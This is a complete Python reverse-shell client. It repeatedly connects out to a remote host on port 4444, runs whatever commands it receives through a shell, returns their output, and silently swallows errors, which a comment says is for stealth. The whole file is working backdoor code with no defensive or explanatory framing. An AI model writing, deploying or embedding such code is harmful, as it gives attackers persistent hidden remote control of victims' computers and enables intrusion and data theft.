import socket
import subprocess
import os
import time

# Configuration for connecting to the server
host = "ip"  # replace with your server IP
port = 4444              # ensure this matches the server's port

while True:
    try:
        # Attempt to connect to the server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
        
        while True:
            # Receive command from server
            command = client_socket.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            
            # Handle 'cd' command separately for directory changes
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    response = f"Changed directory to {os.getcwd()}"
                except Exception as e:
                    response = f"Error: {str(e)}"
            else:
                # Execute other commands
                try:
                    output = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                    response = output.stdout + output.stderr  # capture both stdout and stderr
                except subprocess.TimeoutExpired:
                    response = "Error: Command timed out."
                except Exception as e:
                    response = f"Error: {str(e)}"
            
            # Send response back to server
            client_socket.send(response.encode("utf-8"))

    except (ConnectionRefusedError, BrokenPipeError):
        # Connection failed, retry after delay
        time.sleep(5)
    except Exception as e:
        # General exception handler for logging or debugging
        pass  # Omits printing or logging for stealth

    finally:
        client_socket.close()
